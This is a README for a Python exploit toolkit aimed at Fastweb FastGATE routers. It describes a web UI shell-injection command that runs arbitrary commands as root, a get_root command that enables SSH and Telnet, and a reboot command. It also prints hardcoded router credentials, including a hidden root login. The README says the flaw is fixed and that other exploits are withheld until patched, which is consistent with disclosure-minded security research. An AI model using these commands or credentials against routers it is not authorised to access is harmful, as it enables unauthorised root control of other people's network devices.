# FastGATE Python tool
See wiki for more info: https://github.com/Nimayer/fastgate-toolkit/wiki

## Note

**The vulnerability exploited by this program has been fixed. While we've found many more vulnerabilities and exploited them, we will NOT release the exploits until they're fixed.**

Python tools for Fastweb FastGATE exploits.

```
Usage: fastgate [OPTIONS] COMMAND [ARGS]...

Options:
  -h, --host TEXT     IP address or hostname
  -p, --port INTEGER  HTTP port
  --help              Show this message and exit.

Commands:
  check_login  Check web UI authentication.
  get_root     Attempt to enable access to SSH/Telnet.
  reboot       Reboot router.
  shell        Run command on router with shell injection...
```

## Installation

```sh
pip install https://github.com/Depau/fastgate-python/archive/master.zip
```

## Usage

#### Enable SSH and Telnet from local network:

```sh
fastgate get_root
```
You can then SSH to the router. Log in as `lanadmin`, `lanpasswd`.

In the router's custom shell, run the `sh` hidden command and log in as `lanadmin`, `lanpasswd` or `FASTGate`, `Testplant123` to get a root shell.

#### Reboot router

```sh
fastgate reboot
```

#### Run command as root on router (uses web UI shell injection, no output)

```sh
fastgate shell (command)
# i.e.
fastgate shell /usr/sbin/rc_task firewall restart
fastgate shell /usr/sbin/rc_task sshd restart
```

#### Check web UI login

```sh
fastgate check_login --u username -p password
```
or simply
```sh
fastgate check_login
```
(you will be prompted for login info)

# Credits

- @Nimayer https://github.com/Nimayer/fastgate-toolkit
